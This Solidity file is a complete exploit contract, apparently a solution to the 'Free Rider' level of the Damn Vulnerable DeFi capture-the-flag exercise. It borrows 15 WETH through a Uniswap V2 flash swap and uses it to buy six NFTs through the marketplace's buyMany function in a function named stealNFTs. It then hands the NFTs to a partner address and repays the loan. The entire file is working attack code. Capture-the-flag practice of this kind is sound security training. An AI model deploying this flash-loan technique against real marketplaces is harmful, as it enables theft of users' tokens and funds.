// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title FreeRiderExploit
 * @author Allarious (https://twitter.com/AR_Arjmand)
 */
contract FreeRiderExploit is IERC721Receiver {
    address public owner;

    IERC20 immutable token0;
    WETH immutable token1;

    FreeRiderNFTMarketplace victim;

    IUniswapV2Factory immutable factory;

    IUniswapV2Pair pair;

    address immutable partner;
    DamnValuableNFT nft;

    constructor(
        address _token0,
        address _token1,
        address _factory,
        address payable _victim,
        address _partner,
        address _nft
    ) {
        owner = msg.sender;
        token0 = IERC20(_token0); // DVT
        token1 = WETH(_token1); // WETH
        factory = IUniswapV2Factory(_factory);
        victim = FreeRiderNFTMarketplace(_victim);
        partner = _partner;
        nft = DamnValuableNFT(_nft);
    }

    function setPair() external {
        pair = IUniswapV2Pair(
            factory.getPair(address(token0), address(token1))
        );
    }

    function flashSwap() external {
        require(msg.sender == owner);

        pair.swap(15 ether, 0, address(this), "dummy data");
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        require(
            msg.sender == address(pair),
            "FreeRiderExploit: Only accepts transactions from uniswap pair"
        );
        token1.withdraw(15 ether);

        stealNFTs();

        uint returnAmount = 15 ether + (15 ether * 4) / 1000;

        for (uint i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), partner, i, "");
        }

        token1.deposit{value: returnAmount}();
        token1.transfer(address(pair), returnAmount);
    }

    function stealNFTs() private {
        uint[] memory tokenIds = new uint[](6);

        for (uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        victim.buyMany{value: 15 ether}(tokenIds);
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}

interface WETH {
    function withdraw(uint wad) external;

    function deposit() external payable;

    function transfer(address dst, uint wad) external returns (bool);

    function balanceOf(address add) external returns (uint);
}
